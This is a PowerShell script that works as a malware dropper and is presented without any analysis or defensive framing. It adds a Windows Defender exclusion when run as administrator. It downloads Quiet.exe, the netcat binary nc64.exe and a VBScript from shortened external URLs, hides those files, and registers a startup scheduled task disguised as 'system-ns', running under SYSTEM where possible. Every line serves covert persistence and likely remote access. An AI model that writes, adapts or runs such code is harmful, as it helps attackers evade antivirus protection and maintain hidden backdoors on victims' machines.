# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"

    # Admin rights detected
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"

    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"

    # No admin rights
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files with error handling
try {
    Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
    Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
} catch {
    Write-Output "Failed to download files: $_"
    exit
}

# Make the downloaded files hidden
attrib +H $quietTxtPath
attrib +H $nc64TxtPath
attrib +H $scriptVbsPath

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -AtStartup

$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    if ($isAdmin) {
        # If admin rights, run as NT AUTHORITY\SYSTEM
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

        # Register the task with SYSTEM account
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
    } else {
        # If not admin, run as current user with limited privileges
        $currentUser = "$env:USERDOMAIN\$env:USERNAME"
        $action = "schtasks /create /tn system-ns /tr $scriptVbsPath /sc onstart /rl limited /f"
        Invoke-Expression $action
    }
} catch {
    Write-Output "Failed to register scheduled task: $_"
}